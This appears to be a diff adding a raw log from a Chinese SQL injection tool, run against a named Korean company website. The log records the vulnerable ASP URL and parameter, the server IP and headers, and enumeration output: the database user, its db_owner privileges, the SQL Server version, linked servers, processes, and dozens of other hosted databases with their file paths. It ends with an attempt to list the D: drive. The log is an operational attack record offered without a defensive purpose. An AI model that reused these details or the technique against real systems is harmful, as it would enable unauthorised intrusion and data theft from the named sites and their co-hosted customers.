@@ -1,0 +1,174 @@
+■漏洞信息:============================================================
+ ·URL:http://poong-han.com/rboard/view.asp?id=notice&intPkid=1
+ ·页面标题：::浅茄辫摹 :: 茄惫狼 咐阑 技拌肺 荐免窍绰 扁诀
+ ·参数:id=notice&intPkid=1
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:118.129.167.12
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Server: Microsoft-IIS/5.0
+Date: Mon, 04 Apr 2011 07:07:11 GMT
+Pragma: no-cache
+cache-control: private
+Pragma: no-cache
+cache-control: private
+Connection: Keep-Alive
+Content-Length: 47345
+Content-Type: text/html
+Expires: Sun, 03 Apr 2011 07:07:10 GMT
+Set-Cookie: read%5Farticles=%2Cnotice1; path=/
+Set-Cookie: ASPSESSIONIDACSAQBBR=KOFGJOODEIDJINBIAGFEBPAA; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:poong-han
+ ·版本:Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+取记录数失败，使用设定值：5
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+取记录数失败，使用设定值：5
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+取记录数失败，使用设定值：5
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+取记录数失败，使用设定值：5
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+取记录数失败，使用设定值：5
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+
+
+■数据库信息:============================================================
+- 数据库名：poong-han
+- 用户名：phfood
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：IWDB01
+- 服务名：MSSQLSERVER
+- 系统用户名：phfood
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+153semi	d:\MSSQL\data\153semi_Data.MDF	
+a1s2d3007	D:\MSSQL\DATA\a1s2d3007_Data.MDF	
+academypiano	D:\MSSQL\DATA\academypiano_Data.MDF	
+access	D:\MSSQL\DATA\access_Data.MDF	
+adeko	D:\MSSQL\DATA\adeko_Data.MDF	
+adkang	D:\MSSQL\DATA\adkang_Data.MDF	
+admin-cnn	d:\MSSQL\data\admin-cnn_Data.MDF	
+afbusan	D:\MSSQL\Data\afbusan_Data.MDF	
+africa50	D:\MSSQL\DATA\africa50_Data.MDF	
+agrykid	D:\MSSQL\DATA\agrykid_Data.MDF	
+aidul1004	D:\MSSQL\DATA\aidul1004_Data.MDF	
+akup	d:\mssql\data\iup_Data.MDF	
+allcomas	D:\MSSQL\DATA\allcomas_Data.MDF	
+anabolic	D:\MSSQL\DATA\anabolic_Data.MDF	
+andwi	D:\MSSQL\DATA\andwi_Data.MDF	
+angn08	D:\MSSQL\DATA\angn08_Data.MDF	
+anyhwagong	D:\MSSQL\Data\anyhwagong_Data.MDF	
+anyun1225	D:\MSSQL\DATA\anyun1225_Data.MDF	
+aoneplant	D:\mssql\data\aoneplant_Data.MDF	
+artroric	D:\MSSQL\DATA\artroric_Data.MDF	
+asak2006	D:\MSSQL\DATA\asak2006_Data.MDF	
+asan	D:\MSSQL\DATA\asan_Data.MDF	
+ascproject	D:\MSSQL\Data\ascproject_Data.MDF	
+asemglobal	D:\MSSQL\DATA\asemglobal_Data.MDF	
+asungcad	d:\MSSQL\data\asungcad_Data.MDF	
+atmnet	D:\MSSQL\DATA\atmnet_Data.MDF	
+bagguri	d:\MSSQL\data\bagguri_Data.MDF	
+bang119	d:\MSSQL\data\bang119_Data.MDF	
+bangout	D:\MSSQL\DATA\bangout_Data.MDF	
+beautytimes	d:\MSSQL\Data\beautytimes_Data.MDF	
+bebebuta	D:\MSSQL\DATA\bebebuta_Data.MDF	
+bentekdmc	d:\mssql\data\bentekdmc_Data.MDF	
+bestenc	D:\MSSQL\DATA\bestenc_Data.MDF	
+bizntech	D:\MSSQL\DATA\bizntech_Data.MDF	
+blindnet	D:\MSSQL\DATA\blindnet_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	IWD01	1872	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	IWD01	1872	AWAITING COMMAND	SYSTEM	
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	IWW02	3296	AWAITING COMMAND		
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	IWW02	3296	AWAITING COMMAND		
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	IWW02	3296	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+IWDB01	SQL Server	SQLOLEDB	IWDB01		IWDB01	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
